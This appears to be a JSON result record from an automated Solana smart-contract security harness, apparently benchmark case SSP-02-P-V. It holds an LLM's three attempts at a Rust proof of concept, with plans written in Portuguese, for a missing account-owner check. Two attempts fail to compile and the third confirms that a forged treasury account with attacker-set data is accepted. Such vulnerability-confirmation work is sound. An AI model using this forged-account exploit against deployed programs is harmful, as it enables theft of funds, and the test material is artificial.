@@ -1,0 +1,160 @@
+{
+  "category": "OWNER",
+  "verdict": "confirmed",
+  "exploit_successful": true,
+  "attack_result": "Success",
+  "reason": "ataque aceito e dano verificado: conta forjada com owner diferente do program_id foi aceita e usada; dados maliciosos controlados pelo atacante foram lidos (balance = 999999)",
+  "attempts_used": 3,
+  "attempts": [
+    {
+      "attempt": 1,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2646,
+        "completion_tokens": 734,
+        "latency_s": 4.08
+      },
+      "raw": "{\"plan\": \"O programa `process` (pinocchio) le a conta `treasury` (accounts[0]) via try_borrow_data sem validar o owner. Vou montar um baseline com uma conta treasury legitima (owner = program_id) com dados validos (is_active != 0) para provar que o cenario esta correto. No ataque, substituo a treasury por uma conta forjada cujo owner e outro programa (System Program) mas com os mesmos dados maliciosos controlados pelo atacante. O efeito medido e que a conta forjada foi aceita e usada: o owner da conta resultante difere do program_id e a instrucao teve sucesso.\", \"scenario\": \"let treasury_legit = account(\\n    &env.program_id,\\n    &{\\n        let mut d = vec![0u8; 49];\\n        d[8..40].copy_from_slice(&[7u8; 32]);\\n        d[40..48].copy_from_slice(&1234u64.to_le_bytes());\\n        d[48] = 1;\\n        d\\n    },\\n    None,\\n);\\n\\nlet authority = wallet(1_000_000_000);\\n\\nlet ix = env.raw_ix(&[0u8], &[\\n    AccountMeta::new(treasury_legit_key, false),\\n    AccountMeta::new_readonly(authority_key, false),\\n]);\\n\\nlet baseline_accounts = vec![\\n    (treasury_legit_key, treasury_legit.clone()),\\n    (authority_key, authority.clone()),\\n];\\n\\nlet r_base = env.baseline(\\\"process com treasury legitima\\\", &ix, &baseline_accounts);\\n\\nlet forged_treasury = account(\\n    &solana_sdk::system_program::id(),\\n    &{\\n        let mut d = vec![0u8; 49];\\n        d[8..40].copy_from_slice(&[9u8; 32]);\\n        d[40..48].copy_from_slice(&999_999u64.to_le_bytes());\\n        d[48] = 1;\\n        d\\n    },\\n    None,\\n);\\n\\nlet attack_accounts = vec![\\n    (treasury_legit_key, forged_treasury.clone()),\\n    (authority_key, authority.clone()),\\n];\\n\\nlet r = env.attack(\\\"process com treasury forjada (owner = System Program)\\\", &ix, &attack_accounts);\\n\\nif r.program_result == ProgramResult::Success {\\n    let after_treasury = after(&r, &treasury_legit_key);\\n    env.effect(\\n        \\\"conta forjada com owner diferente do program_id foi aceita e usada\\\",\\n        after_treasury.owner() != &env.program_id,\\n    );\\n    env.effect(\\n        \\\"dados maliciosos controlados pelo atacante foram lidos (balance = 999999)\\\",\\n        read_u64(after_treasury.data(), 40) == 999_999u64,\\n    );\\n}\"}",
+      "plan": "O programa `process` (pinocchio) le a conta `treasury` (accounts[0]) via try_borrow_data sem validar o owner. Vou montar um baseline com uma conta treasury legitima (owner = program_id) com dados validos (is_active != 0) para provar que o cenario esta correto. No ataque, substituo a treasury por uma conta forjada cujo owner e outro programa (System Program) mas com os mesmos dados maliciosos controlados pelo atacante. O efeito medido e que a conta forjada foi aceita e usada: o owner da conta resultante difere do program_id e a instrucao teve sucesso.",
+      "scenario": "let treasury_legit = account(\n    &env.program_id,\n    &{\n        let mut d = vec![0u8; 49];\n        d[8..40].copy_from_slice(&[7u8; 32]);\n        d[40..48].copy_from_slice(&1234u64.to_le_bytes());\n        d[48] = 1;\n        d\n    },\n    None,\n);\n\nlet authority = wallet(1_000_000_000);\n\nlet ix = env.raw_ix(&[0u8], &[\n    AccountMeta::new(treasury_legit_key, false),\n    AccountMeta::new_readonly(authority_key, false),\n]);\n\nlet baseline_accounts = vec![\n    (treasury_legit_key, treasury_legit.clone()),\n    (authority_key, authority.clone()),\n];\n\nlet r_base = env.baseline(\"process com treasury legitima\", &ix, &baseline_accounts);\n\nlet forged_treasury = account(\n    &solana_sdk::system_program::id(),\n    &{\n        let mut d = vec![0u8; 49];\n        d[8..40].copy_from_slice(&[9u8; 32]);\n        d[40..48].copy_from_slice(&999_999u64.to_le_bytes());\n        d[48] = 1;\n        d\n    },\n    None,\n);\n\nlet attack_accounts = vec![\n    (treasury_legit_key, forged_treasury.clone()),\n    (authority_key, authority.clone()),\n];\n\nlet r = env.attack(\"process com treasury forjada (owner = System Program)\", &ix, &attack_accounts);\n\nif r.program_result == ProgramResult::Success {\n    let after_treasury = after(&r, &treasury_legit_key);\n    env.effect(\n        \"conta forjada com owner diferente do program_id foi aceita e usada\",\n        after_treasury.owner() != &env.program_id,\n    );\n    env.effect(\n        \"dados maliciosos controlados pelo atacante foram lidos (balance = 999999)\",\n        read_u64(after_treasury.data(), 40) == 999_999u64,\n    );\n}",
+      "run": {
+        "kind": "compile_error",
+        "events": [],
+        "detail": "error[E0425]: cannot find value `treasury_legit_key` in this scope\n  --> tests/attempt.rs:24:26\n   |\n24 |         AccountMeta::new(treasury_legit_key, false),\n   |                          ^^^^^^^^^^^^^^^^^^\n   |\nhelp: a local variable with a similar name exists\n   |\n24 -         AccountMeta::new(treasury_legit_key, false),\n24 +         AccountMeta::new(treasury_legit, false),\n   |\n\nerror[E0425]: cannot find value `authority_key` in this scope\n  --> tests/attempt.rs:25:35\n   |\n25 |         AccountMeta::new_readonly(authority_key, false),\n   |                                   ^^^^^^^^^^^^^\n   |\nhelp: a local variable with a similar name exists\n   |\n25 -         AccountMeta::new_readonly(authority_key, false),\n25 +         AccountMeta::new_readonly(authority, false),\n   |\n\nerror[E0425]: cannot find value `treasury_legit_key` in this scope\n  --> tests/attempt.rs:29:10\n   |\n29 |         (treasury_legit_key, treasury_legit.clone()),\n   |          ^^^^^^^^^^^^^^^^^^\n   |\nhelp: a local variable with a similar name exists\n   |\n29 -         (treasury_legit_key, treasury_legit.clone()),\n29 +         (treasury_legit, treasury_legit.clone()),\n   |\n\nerror[E0425]: cannot find value `authority_key` in this scope\n  --> tests/attempt.rs:30:10\n   |\n30 |         (authority_key, authority.clone()),",
+        "elapsed_s": 0.7
+      },
+      "verdict": null,
+      "reason": "erro de compilacao:\nerror[E0425]: cannot find value `treasury_legit_key` in this scope\n  --> tests/attempt.rs:24:26\n   |\n24 |         AccountMeta::new(treasury_legit_key, false),\n   |                          ^^^^^^^^^^^^^^^^^^\n   |\nhelp: a local variable with a similar name exists\n   |\n24 -         AccountMeta::new(treasury_legit_key, false),\n24 +         AccountMeta::new(treasury_legit, false),\n   |\n\nerror[E0425]: cannot find value `authority_key` in this scope\n  --> tests/attempt.rs:25:35\n   |\n25 |         AccountMeta::new_readonly(authority_key, false),\n   |                                   ^^^^^^^^^^^^^\n   |\nhelp: a local variable with a similar name exists\n   |\n25 -         AccountMeta::new_readonly(authority_key, false),\n25 +         AccountMeta::new_readonly(authority, false),\n   |\n\nerror[E0425]: cannot find value `treasury_legit_key` in this scope\n  --> tests/attempt.rs:29:10\n   |\n29 |         (treasury_legit_key, treasury_legit.clone()),\n   |          ^^^^^^^^^^^^^^^^^^\n   |\nhelp: a local variable with a similar name exists\n   |\n29 -         (treasury_legit_key, treasury_legit.clone()),\n29 +         (treasury_legit, treasury_legit.clone()),\n   |\n\nerror[E0425]: cannot find value `authority_key` in this scope\n  --> tests/attempt.rs:30:10\n   |\n30 |         (authority_key, authority.clone()),"
+    },
+    {
+      "attempt": 2,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 3555,
+        "completion_tokens": 714,
+        "latency_s": 3.68
+      },
+      "raw": "{\"plan\": \"Preparo uma conta treasury legitima com owner = program_id e dados validos (is_active=1) e uma authority. O baseline chama process com essa treasury legitima, provando que o cenario esta correto. O ataque repete a mesma chamada, mas substitui a treasury por uma conta forjada com owner = System Program e dados controlados pelo atacante. O efeito mede que a conta forjada (owner diferente do program_id) foi aceita e usada, e que os dados maliciosos foram lidos.\", \"scenario\": \"let treasury_key = Pubkey::new_unique();\\nlet authority_key = Pubkey::new_unique();\\n\\nlet treasury_legit = account(\\n    &env.program_id,\\n    &{\\n        let mut d = vec![0u8; 49];\\n        d[8..40].copy_from_slice(&[7u8; 32]);\\n        d[40..48].copy_from_slice(&1234u64.to_le_bytes());\\n        d[48] = 1;\\n        d\\n    },\\n    None,\\n);\\n\\nlet authority = wallet(1_000_000_000);\\n\\nlet ix = env.raw_ix(&[0u8], &[\\n    AccountMeta::new(treasury_key, false),\\n    AccountMeta::new_readonly(authority_key, false),\\n]);\\n\\nlet baseline_accounts = vec![\\n    (treasury_key, treasury_legit.clone()),\\n    (authority_key, authority.clone()),\\n];\\n\\nlet _r_base = env.baseline(\\\"process com treasury legitima\\\", &ix, &baseline_accounts);\\n\\nlet forged_treasury = account(\\n    &solana_sdk::system_program::id(),\\n    &{\\n        let mut d = vec![0u8; 49];\\n        d[8..40].copy_from_slice(&[9u8; 32]);\\n        d[40..48].copy_from_slice(&999_999u64.to_le_bytes());\\n        d[48] = 1;\\n        d\\n    },\\n    None,\\n);\\n\\nlet attack_accounts = vec![\\n    (treasury_key, forged_treasury.clone()),\\n    (authority_key, authority.clone()),\\n];\\n\\nlet r = env.attack(\\\"process com treasury forjada (owner = System Program)\\\", &ix, &attack_accounts);\\n\\nif r.program_result == ProgramResult::Success {\\n    let after_treasury = after(&r, &treasury_key);\\n    env.effect(\\n        \\\"conta forjada com owner diferente do program_id foi aceita e usada\\\",\\n        after_treasury.owner() != &env.program_id,\\n    );\\n    env.effect(\\n        \\\"dados maliciosos controlados pelo atacante foram lidos (balance = 999999)\\\",\\n        read_u64(after_treasury.data(), 40) == 999_999u64,\\n    );\\n}\"}",
+      "plan": "Preparo uma conta treasury legitima com owner = program_id e dados validos (is_active=1) e uma authority. O baseline chama process com essa treasury legitima, provando que o cenario esta correto. O ataque repete a mesma chamada, mas substitui a treasury por uma conta forjada com owner = System Program e dados controlados pelo atacante. O efeito mede que a conta forjada (owner diferente do program_id) foi aceita e usada, e que os dados maliciosos foram lidos.",
+      "scenario": "let treasury_key = Pubkey::new_unique();\nlet authority_key = Pubkey::new_unique();\n\nlet treasury_legit = account(\n    &env.program_id,\n    &{\n        let mut d = vec![0u8; 49];\n        d[8..40].copy_from_slice(&[7u8; 32]);\n        d[40..48].copy_from_slice(&1234u64.to_le_bytes());\n        d[48] = 1;\n        d\n    },\n    None,\n);\n\nlet authority = wallet(1_000_000_000);\n\nlet ix = env.raw_ix(&[0u8], &[\n    AccountMeta::new(treasury_key, false),\n    AccountMeta::new_readonly(authority_key, false),\n]);\n\nlet baseline_accounts = vec![\n    (treasury_key, treasury_legit.clone()),\n    (authority_key, authority.clone()),\n];\n\nlet _r_base = env.baseline(\"process com treasury legitima\", &ix, &baseline_accounts);\n\nlet forged_treasury = account(\n    &solana_sdk::system_program::id(),\n    &{\n        let mut d = vec![0u8; 49];\n        d[8..40].copy_from_slice(&[9u8; 32]);\n        d[40..48].copy_from_slice(&999_999u64.to_le_bytes());\n        d[48] = 1;\n        d\n    },\n    None,\n);\n\nlet attack_accounts = vec![\n    (treasury_key, forged_treasury.clone()),\n    (authority_key, authority.clone()),\n];\n\nlet r = env.attack(\"process com treasury forjada (owner = System Program)\", &ix, &attack_accounts);\n\nif r.program_result == ProgramResult::Success {\n    let after_treasury = after(&r, &treasury_key);\n    env.effect(\n        \"conta forjada com owner diferente do program_id foi aceita e usada\",\n        after_treasury.owner() != &env.program_id,\n    );\n    env.effect(\n        \"dados maliciosos controlados pelo atacante foram lidos (balance = 999999)\",\n        read_u64(after_treasury.data(), 40) == 999_999u64,\n    );\n}",
+      "run": {
+        "kind": "compile_error",
+        "events": [],
+        "detail": "error[E0308]: mismatched types\n   --> tests/attempt.rs:26:33\n    |\n 26 |       let ix = env.raw_ix(&[0u8], &[\n    |  __________________------_________^\n    | |                  |\n    | |                  arguments to this method are incorrect\n 27 | |         AccountMeta::new(treasury_key, false),\n 28 | |         AccountMeta::new_readonly(authority_key, false),\n 29 | |     ]);\n    | |_____^ expected `Vec<AccountMeta>`, found `&[AccountMeta; 2]`\n    |\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 1 previous error",
+        "elapsed_s": 0.7
+      },
+      "verdict": null,
+      "reason": "erro de compilacao:\nerror[E0308]: mismatched types\n   --> tests/attempt.rs:26:33\n    |\n 26 |       let ix = env.raw_ix(&[0u8], &[\n    |  __________________------_________^\n    | |                  |\n    | |                  arguments to this method are incorrect\n 27 | |         AccountMeta::new(treasury_key, false),\n 28 | |         AccountMeta::new_readonly(authority_key, false),\n 29 | |     ]);\n    | |_____^ expected `Vec<AccountMeta>`, found `&[AccountMeta; 2]`\n    |\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 1 previous error"
+    },
+    {
+      "attempt": 3,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 3358,
+        "completion_tokens": 757,
+        "latency_s": 3.77
+      },
+      "raw": "{\n  \"plan\": \"Preparo uma conta treasury legítima (owner = program_id) com dados válidos e uma authority, e chamo baseline com a instrução process (dados [0]) para provar que o cenário está correto. No ataque, substituo apenas a treasury por uma conta forjada cujo owner é o System Program, mantendo os mesmos dados maliciosos nos offsets 8..40, 40..48 e 48. Se o programa aceitar a conta forjada (Success), registro como efeito que o owner da conta usada difere do program_id e que os dados controlados pelo atacante foram lidos.\",\n  \"scenario\": \"let treasury_key = Pubkey::new_unique();\\nlet authority_key = Pubkey::new_unique();\\n\\nlet treasury_legit = account(\\n    &env.program_id,\\n    &{\\n        let mut d = vec![0u8; 49];\\n        d[8..40].copy_from_slice(&[7u8; 32]);\\n        d[40..48].copy_from_slice(&1234u64.to_le_bytes());\\n        d[48] = 1;\\n        d\\n    },\\n    None,\\n);\\n\\nlet authority = wallet(1_000_000_000);\\n\\nlet ix = env.raw_ix(\\n    &[0u8],\\n    vec![\\n        AccountMeta::new(treasury_key, false),\\n        AccountMeta::new_readonly(authority_key, false),\\n    ],\\n);\\n\\nlet baseline_accounts = vec![\\n    (treasury_key, treasury_legit.clone()),\\n    (authority_key, authority.clone()),\\n];\\n\\nlet _r_base = env.baseline(\\\"process com treasury legitima\\\", &ix, &baseline_accounts);\\n\\nlet forged_treasury = account(\\n    &solana_sdk::system_program::id(),\\n    &{\\n        let mut d = vec![0u8; 49];\\n        d[8..40].copy_from_slice(&[9u8; 32]);\\n        d[40..48].copy_from_slice(&999_999u64.to_le_bytes());\\n        d[48] = 1;\\n        d\\n    },\\n    None,\\n);\\n\\nlet attack_accounts = vec![\\n    (treasury_key, forged_treasury.clone()),\\n    (authority_key, authority.clone()),\\n];\\n\\nlet r = env.attack(\\n    \\\"process com treasury forjada (owner = System Program)\\\",\\n    &ix,\\n    &attack_accounts,\\n);\\n\\nif r.program_result == ProgramResult::Success {\\n    let after_treasury = after(&r, &treasury_key);\\n    env.effect(\\n        \\\"conta forjada com owner diferente do program_id foi aceita e usada\\\",\\n        after_treasury.owner() != &env.program_id,\\n    );\\n    env.effect(\\n        \\\"dados maliciosos controlados pelo atacante foram lidos (balance = 999999)\\\",\\n        read_u64(after_treasury.data(), 40) == 999_999u64,\\n    );\\n}\"\n}",
+      "plan": "Preparo uma conta treasury legítima (owner = program_id) com dados válidos e uma authority, e chamo baseline com a instrução process (dados [0]) para provar que o cenário está correto. No ataque, substituo apenas a treasury por uma conta forjada cujo owner é o System Program, mantendo os mesmos dados maliciosos nos offsets 8..40, 40..48 e 48. Se o programa aceitar a conta forjada (Success), registro como efeito que o owner da conta usada difere do program_id e que os dados controlados pelo atacante foram lidos.",
+      "scenario": "let treasury_key = Pubkey::new_unique();\nlet authority_key = Pubkey::new_unique();\n\nlet treasury_legit = account(\n    &env.program_id,\n    &{\n        let mut d = vec![0u8; 49];\n        d[8..40].copy_from_slice(&[7u8; 32]);\n        d[40..48].copy_from_slice(&1234u64.to_le_bytes());\n        d[48] = 1;\n        d\n    },\n    None,\n);\n\nlet authority = wallet(1_000_000_000);\n\nlet ix = env.raw_ix(\n    &[0u8],\n    vec![\n        AccountMeta::new(treasury_key, false),\n        AccountMeta::new_readonly(authority_key, false),\n    ],\n);\n\nlet baseline_accounts = vec![\n    (treasury_key, treasury_legit.clone()),\n    (authority_key, authority.clone()),\n];\n\nlet _r_base = env.baseline(\"process com treasury legitima\", &ix, &baseline_accounts);\n\nlet forged_treasury = account(\n    &solana_sdk::system_program::id(),\n    &{\n        let mut d = vec![0u8; 49];\n        d[8..40].copy_from_slice(&[9u8; 32]);\n        d[40..48].copy_from_slice(&999_999u64.to_le_bytes());\n        d[48] = 1;\n        d\n    },\n    None,\n);\n\nlet attack_accounts = vec![\n    (treasury_key, forged_treasury.clone()),\n    (authority_key, authority.clone()),\n];\n\nlet r = env.attack(\n    \"process com treasury forjada (owner = System Program)\",\n    &ix,\n    &attack_accounts,\n);\n\nif r.program_result == ProgramResult::Success {\n    let after_treasury = after(&r, &treasury_key);\n    env.effect(\n        \"conta forjada com owner diferente do program_id foi aceita e usada\",\n        after_treasury.owner() != &env.program_id,\n    );\n    env.effect(\n        \"dados maliciosos controlados pelo atacante foram lidos (balance = 999999)\",\n        read_u64(after_treasury.data(), 40) == 999_999u64,\n    );\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM"
+          },
+          {
+            "step": "baseline",
+            "note": "process com treasury legitima",
+            "result": "Success",
+            "compute_units": 395,
+            "account_flags": "-w,-r",
+            "ix_head": "00",
+            "accounts": [
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 49,
+                "head": "0000000000000000",
+                "digest": "15c60cc5abead589",
+                "post": "00000000000000000707070707070707070707070707070707070707070707070707070707070707d20400000000000001"
+              },
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": false,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "process com treasury forjada (owner = System Program)",
+            "result": "Success",
+            "compute_units": 395,
+            "account_flags": "-w,-r",
+            "ix_head": "00",
+            "accounts": [
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": false,
+                "writable": true,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 49,
+                "head": "0000000000000000",
+                "digest": "0a2dfbb10808b146",
+                "post": "000000000000000009090909090909090909090909090909090909090909090909090909090909093f420f000000000001"
+              },
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": false,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "effect",
+            "note": "conta forjada com owner diferente do program_id foi aceita e usada",
+            "holds": true
+          },
+          {
+            "step": "effect",
+            "note": "dados maliciosos controlados pelo atacante foram lidos (balance = 999999)",
+            "holds": true
+          }
+        ],
+        "runtime_trace": [
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 395 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 395 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success"
+        ],
+        "elapsed_s": 1.8
+      },
+      "verdict": "confirmed",
+      "reason": "ataque aceito e dano verificado: conta forjada com owner diferente do program_id foi aceita e usada; dados maliciosos controlados pelo atacante foram lidos (balance = 999999)"
+    }
+  ],
+  "case_id": "SSP-02-P-V",
+  "static_finding": {
+    "category": "OWNER",
+    "confidence": "high",
+    "evidence": "let treasury = &accounts[0];\nlet data = treasury.try_borrow_data()?;\nlet stored_authority = read_pubkey(&data[8..40]);\nlet balance = u64::from_le_bytes(data[40..48]...);\nlet is_active = data[48] != 0;",
+    "explanation": "Os dados da conta `treasury` sao lidos diretamente via `try_borrow_data()` sem verificar `treasury.owner == program_id`. Em Rust nativo (pinocchio) nao ha o wrapper `Account<'info, T>` do Anchor que valida o proprietario automaticamente, e nenhuma checagem manual de `owner` foi feita.",
+    "attack_hypothesis": "Um atacante fornece uma conta forjada cujo `owner` e outro programa (ou uma conta arbitraria) contendo dados maliciosos nos offsets 8..40, 40..48 e 48, fazendo o programa ler uma `stored_authority`, `balance` e `is_active` controlados pelo atacante."
+  }
+}
